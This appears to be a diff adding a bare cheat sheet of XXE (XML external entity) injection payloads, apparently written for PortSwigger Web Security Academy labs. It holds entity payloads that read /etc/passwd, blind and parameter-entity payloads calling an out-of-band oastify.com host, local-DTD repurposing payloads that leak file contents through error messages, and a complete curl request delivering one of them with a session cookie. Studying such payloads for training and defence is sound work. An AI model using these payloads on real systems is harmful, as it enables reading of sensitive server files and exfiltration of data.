@@ -1,0 +1,60 @@
+
+Regular entity:
+--------------
+
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
+
+
+Blind Regular entity:
+---------------------
+
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://k9udhvjgzvaf2v2dlzdf10um5db3zs.oastify.com">]>
+
+
+
+Parameter entity:
+----------------
+
+<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://k9udhvjgzvaf2v2dlzdf10um5db3zs.oastify.com"> %xxe;]>
+
+
+
+Repurposing a Local DTD
+-----------------------
+
+<!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/doesnotexit"> %xxe;]>
+
+---------------
+
+<!DOCTYPE root [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamsa '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+
+---------------
+
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+
+--------------------
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: 0a6500360452b7f581ea1b94001c00d1.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://0a6500360452b7f581ea1b94001c00d1.web-security-academy.net/product?productId=2' -H $'Content-Type: application/xml' -H $'Content-Length: 423' -H $'Origin: https://0a6500360452b7f581ea1b94001c00d1.web-security-academy.net' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Gpc: 1' -H $'Te: trailers' \
+    -b $'session=oHAsolspYXpME8Ntz90oKpnvBPgNRy00' \
+    --data-binary $'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE message [\x0d\x0a<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\x0d\x0a<!ENTITY % ISOamso \'\x0d\x0a<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">\x0d\x0a<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">\x0d\x0a&#x25;eval;\x0d\x0a&#x25;error;\x0d\x0a\'>\x0d\x0a%local_dtd;\x0d\x0a]><stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>' \
+    $'https://0a6500360452b7f581ea1b94001c00d1.web-security-academy.net/product/stock'
